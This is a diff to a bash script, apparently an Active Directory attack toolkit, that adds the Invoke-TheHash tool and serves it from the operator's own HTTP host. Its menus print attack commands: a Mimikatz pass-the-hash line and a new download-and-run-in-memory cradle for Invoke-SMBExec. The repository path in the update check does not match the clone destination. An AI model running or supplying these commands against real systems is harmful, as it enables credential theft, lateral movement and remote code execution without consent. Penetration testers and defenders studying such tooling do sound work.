@@ -114,6 +114,7 @@ DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
 EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 InveighLocalRepo="$HOME/ADAT/Inveigh"
+InvokeTheHashRepo="$HOME/ADAT/Invoke-TheHash"
 InvokeNoPacLocalRepo="$HOME/ADAT/Invoke-NoPac"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
@@ -307,6 +308,21 @@ else
 	echo -e ""
 fi
 
+if [ -d "$InvokeTheHashRepo" ]
+then
+	echo -e ""
+    	echo -e "Invoke-TheHash is installed, checking if updated to latest version."
+    	cd $InvokeTheHashRepo
+    	git pull "https://github.com/Kevin-Robertson/Invoke-TheHash.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Invoke-TheHash Repo${RESTORE}"
+	git clone --recursive "https://github.com/Kevin-Robertson/Invoke-TheHash.git" $HOME/ADAT/InvokeTheHashRepo
+	echo -e ""
+fi
+
+
 # Copy local repo contents to single folder
 
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
@@ -322,6 +338,7 @@ cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/adPEASRepo/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/InvokeTheHashRepo/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -340,6 +357,7 @@ PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
 InveighRepo="http://$LocalIP:$LocalPort/"
 DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
 InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
+InvokeTheHashRepo="http://$LocalIP:$LocalPort/"
 adPEASRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
@@ -515,6 +533,13 @@ echo -e ""
 echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTORE}"
 echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
 echo -e ""
+echo -e ""
+echo -e "${IBLUE}Invoke-SMBExec${RESTORE}"  
+echo -e ""
+echo -e "${YELLOW}Load Invoke-SMBExec into memory${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SMBExec.ps1);Invoke-SMBExec"
+echo -e ""
+
 echo -e ""
 
 echo -ne  "Return to Previous Menu?
@@ -1868,7 +1893,7 @@ echo -ne " Select MiTM Type
         read a
         case $a in
                 1) 	Internal_Menu_MiTM_Inveigh ;;
-        	q|Q)	Internal_Menu_MiTM_Attacks ;;
+        	q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
